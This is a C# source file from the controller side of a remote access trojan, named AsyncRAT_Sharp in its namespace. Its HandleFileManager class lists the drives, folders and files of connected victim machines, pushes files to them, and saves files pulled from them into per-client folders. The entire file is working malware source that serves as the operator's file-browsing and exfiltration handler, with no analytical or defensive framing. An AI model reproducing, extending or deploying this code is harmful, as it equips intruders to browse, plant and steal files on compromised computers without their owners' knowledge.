using AsyncRAT_Sharp.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using AsyncRAT_Sharp.Helper;
using System.Diagnostics;

namespace AsyncRAT_Sharp.Handle_Packet
{
    public class HandleFileManager
    {
        public void FileManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "getDrivers":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                    if (FM != null)
                                    {
                                        FM.listView1.Items.Clear();
                                        string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        for (int i = 0; i < driver.Length; i++)
                                        {
                                            if (driver[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = driver[i];
                                                lv.ToolTipText = driver[i];
                                                if (driver[i + 1] == "Fixed") lv.ImageIndex = 1;
                                                else if (driver[i + 1] == "Removable") lv.ImageIndex = 2;
                                                else lv.ImageIndex = 1;
                                                FM.listView1.Items.Add(lv);
                                            }
                                            i += 1;
                                        }
                                    }
                                }));
                            }
                            break;
                        }

                    case "getPath":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                    if (FM != null)
                                    {
                                        FM.listView1.Items.Clear();
                                        FM.listView1.Groups.Clear();
                                        string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        ListViewGroup groupFolder = new ListViewGroup("Folders");
                                        FM.listView1.Groups.Add(groupFolder);
                                        int numFolders = 0;
                                        for (int i = 0; i < _folder.Length; i++)
                                        {
                                            if (_folder[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = _folder[i];
                                                lv.ToolTipText = _folder[i + 1];
                                                lv.Group = groupFolder;
                                                lv.ImageIndex = 0;
                                                FM.listView1.Items.Add(lv);
                                                numFolders += 1;
                                            }
                                            i += 1;

                                        }

                                        string[] _file = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        ListViewGroup groupFile = new ListViewGroup("Files");
                                        FM.listView1.Groups.Add(groupFile);
                                        int numFiles = 0;
                                        for (int i = 0; i < _file.Length; i++)
                                        {
                                            if (_file[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = Path.GetFileName(_file[i]);
                                                lv.ToolTipText = _file[i + 1];
                                                Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_file[i + 2])));
                                                FM.imageList1.Images.Add(_file[i + 1], im);
                                                lv.ImageKey = _file[i + 1];
                                                lv.Group = groupFile;
                                                lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_file[i + 3])));
                                                FM.listView1.Items.Add(lv);
                                                numFiles += 1;
                                            }
                                            i += 3;
                                        }
                                        FM.toolStripStatusLabel2.Text = $"       Folder[{numFolders.ToString()}]   Files[{numFiles.ToString()}]";
                                    }
                                }));
                            }
                            break;
                        }

                    case "reqUploadFile":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(async () =>
                                {
                                    FormDownloadFile FD = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
                                    if (FD != null)
                                    {
                                        FD.C = client;
                                        FD.timer1.Start();
                                        MsgPack msgpack = new MsgPack();
                                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                                        msgpack.ForcePathObject("Command").AsString = "uploadFile";
                                        await msgpack.ForcePathObject("File").LoadFileAsBytes(FD.fullFileName);
                                        msgpack.ForcePathObject("Name").AsString = FD.clientFullFileName;
                                        ThreadPool.QueueUserWorkItem(FD.Send, msgpack.Encode2Bytes());
                                    }
                                }));
                            }
                            break;
                        }

                }
            }
            catch { }
        }
        public void SocketDownload(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "pre":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {

                                    string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                    string file = unpack_msgpack.ForcePathObject("File").AsString;
                                    string size = unpack_msgpack.ForcePathObject("Size").AsString;
                                    FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                    if (SD != null)
                                    {
                                        SD.C = client;
                                        SD.labelfile.Text = Path.GetFileName(file);
                                        SD.dSize = Convert.ToInt64(size);
                                        SD.timer1.Start();
                                    }
                                }));
                            }
                            break;
                        }

                    case "save":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(async () =>
                                {
                                    string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                    FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                    if (SD != null)
                                    {
                                        if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
                                            Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "")));
                                        string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
                                        if (File.Exists(filename))
                                        {
                                            File.Delete(filename);
                                            await Task.Delay(500);
                                        }
                                        File.WriteAllBytes(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString), unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                    }
                                }));
                            }
                            break;
                        }
                }

            }
            catch { }
        }
    }
}
